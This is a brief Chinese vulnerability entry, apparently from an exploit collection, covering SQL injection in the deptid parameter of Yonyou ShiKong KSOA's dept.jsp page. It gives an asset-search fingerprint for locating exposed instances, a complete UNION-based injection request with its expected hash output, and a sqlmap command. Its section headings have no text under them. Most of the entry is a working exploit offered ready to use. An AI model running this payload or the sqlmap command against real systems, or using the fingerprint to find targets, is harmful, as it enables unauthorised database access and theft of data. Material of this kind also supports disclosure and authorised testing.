# 用友时空KSOAdeptid参数存在SQL注入漏洞

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友时空 KSOA"`
- **请求**：`GET /common/dept.jsp?deptid=1%27%20UNION%20ALL%20SELECT%2060%2Csys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27%2C%27sterben.cc%27))-- HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Cookie: JSESSIONID=E14B6EF446CB3E488A4A36FEADAAC0B8`

**请求体 / payload**
```
0x933fb5f36cd5c0f996fe70743232bbbc

sqlmap
sqlmap -u "http://xx.xx.xx.xx/common/dept.jsp?deptid=1" --batch
```

**其他**
- 用友时空KSOA deptid参数存在SQL注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友时空KSOA